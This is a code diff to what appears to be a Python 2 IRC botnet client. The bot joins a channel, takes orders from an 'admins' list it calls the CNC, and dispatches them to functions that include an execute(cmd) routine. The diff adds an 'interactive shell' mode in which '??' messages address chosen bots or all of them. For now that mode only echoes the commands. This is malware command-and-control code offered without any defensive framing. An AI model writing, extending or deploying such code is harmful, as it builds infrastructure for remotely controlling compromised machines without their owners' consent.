@@ -45,7 +45,6 @@ def execute(cmd):
 
 #actually sending the data
 def sendData(data):
-	
 	#sending multiple lines if it's a list
 	if type(data) is list:
 		for line in data:
@@ -96,6 +95,10 @@ port = 6667
 channel = "#lobby"
 botnick = genNick()
 
+#other vars
+INTERACT = [0, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
+					#index two is the boolean for if the interactive shell is with this bot
+
 print "The botnick is:", botnick
 
 #dictionary of functions
@@ -114,8 +117,11 @@ commands = {
 def parseCommand(command):
 	if DEBUG:
 		print "command is '%s'" % command
-	arg = "PRIVMSG"
-	if (arg in command):
+
+	# print "interact 0: " + str(not INTERACT[0])
+	# print "interact 1: " + str(not INTERACT[1])
+
+	if INTERACT[1] and "PRIVMSG" in command: #check if we should respond or not and if we find privmsg, we're good!
 		user = command[1:command.index("!~")] #user sending message
 		host = command[(command.index("!~") + 2):command.index(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
 		hostname = host[:host.index("@")] #hostname: 'blarg'
@@ -126,17 +132,48 @@ def parseCommand(command):
 			print "hostname is '%s'" % hostname
 			print "client is '%s'" % client
 		if user in admins:
-			tempCommand = command[command.index(arg):]
+			tempCommand = command[command.index("PRIVMSG"):]
 			command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()
-			
+
 			print "Recieved %s from the CNC" % command
-			if command in commands.keys():
+			if INTERACT[0]:
+				if "??finish" in command:
+					INTERACT[0] = 0
+					return
+
+				sendData("I would have performed: '" + command + "'")
+			elif "??" in command:
+				INTERACT[0] = 1
+				users = command[2:command.index(":")].split(" ")
+				command = command[(command.index(":") + 1):].strip()
+
+				if DEBUG:
+					print "command is '%s'" % command
+				for user in users:
+					print "user is '%s'" % user
+
+				if not botnick in users and not "all" in users:
+					INTERACT[1] = 0
+					return
+
+				sendData("I would have performed: '" + command + "'")
+			elif command in commands.keys():
 				commands[command]()
 				print "function called"
 			else:
 				print "command '%s' not defined" % command
 		else:
 			print "user '%s' not in list of admins" % user
+	else: #we should not be listening, so we'll wait for '??stop' to end interactive shell
+		# print "inside the interact else"
+		if "PRIVMSG" in command:
+			# print "inside interact else, privmsg if"
+			if "??finish" in command:
+				# print "inside interact else, privmsg if, ??finish if"
+				# print "interact 0: '%d'" % INTERACT[0]
+				# print "interact 1: '%d'" % INTERACT[1]
+				INTERACT[0] = 0
+				INTERACT[1] = 1
 
 
 #Connecting to the IRC Server
@@ -152,7 +189,8 @@ if DEBUG:
 
 counter = 2
 while "nickname already in use" in temp.lower():
-	irc.send("NICK " + botnick + "-" + str(counter) + "\n") #sets nick
+	botnick = botnick + "-" + str(counter)
+	irc.send("NICK " + botnick + "\n") #sets nick
 	temp=irc.recv(4096) #get response to setting nick
 	if DEBUG:
 		print "text received: '%s'\niteration %d" % (temp, counter)
